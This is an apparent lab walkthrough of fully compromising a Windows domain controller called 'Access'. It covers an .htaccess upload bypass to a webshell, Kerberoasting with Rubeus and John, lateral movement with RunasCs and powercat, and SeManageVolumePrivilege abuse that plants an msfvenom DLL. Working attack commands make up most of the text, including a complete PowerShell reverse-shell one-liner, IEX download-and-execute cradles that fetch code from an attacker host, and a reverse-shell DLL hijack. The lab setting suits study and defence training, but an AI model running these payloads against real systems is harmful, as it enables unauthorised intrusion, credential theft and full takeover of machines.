---
description: >-
  Leveraged SeManageVolumePrivilege and DLL hijacking permission to escalate
  privileges.
---

# Access

## Summary

* The machine had a file upload functionality but implemented protections that denied uploading files with a .php extension.
* The web application allowed the upload of .htaccess files, enabling a bypass of these defenses.
* Uploading a webshell provided access to the <mark style="color:red;">svc\_apache</mark> user.
* Another user, svc\_mssql, was identified on the machine, and an SPN was present for this user.
  * This situation was ideal for attempting Kerberoasting.
* Rubeus.exe was used to perform Kerberoasting, successfully retrieving the password for the svc\_mssql user.
* The svc\_mssql user had the <mark style="color:red;">SeManageVolumePrivilege</mark>, which was exploited using <mark style="color:green;">seManageVolumnExploit.exe</mark> to gain administrative write privileges on the entire machine.
* DLL injection was used to inject a malicious DLL, resulting in a reverse shell as the NT user.



## Let's unpack

### Enumeration

```bash
# Nmap
sudo nmap -sC -sN -A -oN nmapFull -p- -A 192.168.176.187
 
Nmap scan report for 192.168.176.187
Host is up (0.073s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-27 14:48:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49790/tcp open  msrpc         Microsoft Windows RPC
```

A web app on port 80 had upload functionality and implemented all possible protections to prevent Arbitrary file upload issues. However, it also supported the upload of a <mark style="background-color:red;">.htaccess</mark> file.

Bypassing PHP protection by uploading `.htaccess` file

{% embed url="http://michalszalkowski.com/security/pentesting-web/file-upload-bypass-htaccess/" %}

```bash
cat .htaccess 
AddType application/x-httpd-php .evil
```

on uploading this file, `.evil` extension will be interpreted as php and will get executed.&#x20;

### Initial Foothold

Let's get reverse shell using above findings

```bash
## 1. Executing the following command in our webshell

# ps1 reverse shell code
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.209",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# spawning server
python3 -m http.server 8080

## 2. Executing the following command in our webshell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.209:8000/exp.ps1')"

# URL encode the above command to send it through thr webshell
powershell%20-c%20%22IEX%28New-Object%20System.Net.WebClient%29.DownloadString%28%27http%3A%2F%2F192.168.45.209%3A8000%2Fexp.ps1%27%29%22%0A

# In parallel, run netcat to catch the reverse shell
nc -nlvp 4444

# Let's Execute
curl http://192.168.161.187/uploads/ex.php.evil?cmd=powershell%20-c%20%22IEX%28New-Object%20System.Net.WebClient%29.DownloadString%28%27http%3A%2F%2F192.168.45.231%3A8000%2Fexp.ps1%27%29%22%0A
```

### Privilege Escalation/Lateral Movement

On getting a reverse shell, I found a user list

<pre class="language-bash"><code class="lang-bash"> net users
<strong>>
</strong><strong>Administrator            Guest                    krbtgt                   
</strong>svc_apache               svc_mssql  
</code></pre>

Found SPN of svc\_mssql service, which indicates that we could perform Kerberosting

```powershell
# Using Rubeus.exe to perform Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Using John to crack the hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash


# Got the password of svc_mssql
trustno1
```

Getting a shell as svc\_mssql using RunasCs as Remote access is disabled for this user.&#x20;

#### Lateral Movement (svc\_apache -> svc\_mssql)

[https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

```powershell
# running ps1 script of runAscs
> 
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"

# using powercat to get reverse shell
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.231:8000/powercat.ps1');powercat -c 192.168.45.231 -p 5555 -e cmd"
```



#### PrivEsc (svc\_mssql -> administrator)

```powershell
# svc_mssql had the following privileges
# whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled


https://github.com/CsEnox/SeManageVolumeExploit
```



We are going to escalate privileges using the <mark style="background-color:red;">SeManageVolumePrivilege</mark> permission.

{% embed url="https://github.com/CsEnox/SeManageVolumeExploit" %}

<details>

<summary>TL'DR</summary>

If a user has privileges, we can use the following technique to get elevated shell.

### Background

The general idea is that the attacker can leverage this particular privilege with the exploitation to get full control over "C:\\", and then it can craft a ".dll" file and place it in somewhere "C:\Windows\System32\\" to trigger the payload as root.

### Technique

On executing the exploit, we can write anything in the <mark style="color:red;">C:\\</mark> directory. A simple Priv escalation would be to add a malicious DLL that would give us an elevated reverse shell on execution.

</details>

Download [this](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) exploit and transfer it to victim machine

```bash
# Transfer and execute the exploit to window machine
.\SeManageVolumeExploit.exe

# on executingm, we should be able to write anything in C:\windows\system32\*
icacls.exe C:\Windows\System32\
```

Now, we need to create a malicious DLL that would give us a reverse shell

```bash
# using msfvenom
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.49.231 LPORT=6666 -f dll -o tzres.dll


# start nc listner on 6666
nc -nlvp 6666
```

Now, place this DLL in such a place where executing it would be simple, for instance on running `systeminfo` command we should be able to get a reverse shell.

we can move the DLL to `C:\\windows\\system32\\wbem` directory

```bash
copy tzres.dll C:\Windows\System32\wbem\

# just exeucte the systeminfo command, you will get a reverse shell as Admin
```

Refer to this amazing ddlref created by S1ren:

{% embed url="https://sirensecurity.io/blog/dllref/" %}

<mark style="background-color:red;">dllref</mark> is a list of DLLs that can be used for privilege escalation. This list not only includes various options but also the trigger points for each DLL. In our case, other DLLs can be used instead of <mark style="color:red;">tzres.dll</mark> to achieve the reverse shell trigger.



